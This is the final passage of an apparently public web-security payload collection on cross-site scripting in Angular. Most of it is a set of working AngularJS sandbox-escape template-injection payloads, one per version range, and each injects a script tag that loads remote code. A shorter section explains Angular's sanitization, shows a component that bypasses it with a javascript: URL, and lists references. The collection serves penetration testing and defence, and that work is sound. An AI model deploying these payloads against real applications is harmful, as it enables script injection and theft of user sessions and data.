<!-- source: XSS Injection/5 - XSS in Angular.md | chunk 3/3 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```

1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),a')
}}
```

1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`var _=document.createElement(\'script\');
    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
}}
```

1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## Automatic Sanitization

> To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.

However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:

* bypassSecurityTrustHtml
* bypassSecurityTrustScript
* bypassSecurityTrustStyle
* bypassSecurityTrustUrl
* bypassSecurityTrustResourceUrl

Example of a component using the unsecure method `bypassSecurityTrustUrl`:

```js
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'my-app',
  template: `
    <h4>An untrusted URL:</h4>
    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">Click me</a></p>
    <h4>A trusted URL:</h4>
    <p><a class="e2e-trusted-url" [href]="trustedUrl">Click me</a></p>
  `,
})
export class App {
  constructor(private sanitizer: DomSanitizer) {
    this.dangerousUrl = 'javascript:alert("Hi there")';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
}
```

![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)

When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.

## References

* [Angular Security - May 16, 2023](https://angular.io/guide/security)
* [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson (@MtnBer) - July 11, 2024](https://web.archive.org/web/20250118075113/https://matanber.com/blog/4-char-csti)
* [Blind XSS AngularJS Payloads - Lewis Ardern - December 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)
* [Bypass DomSanitizer - Swarna (@swarnakishore) - August 11, 2017](https://web.archive.org/web/20250908023652/https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
* [XSS without HTML - CSTI with Angular JS - Gareth Heyes (@garethheyes) - January 27, 2016](https://web.archive.org/web/20190331015852/https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
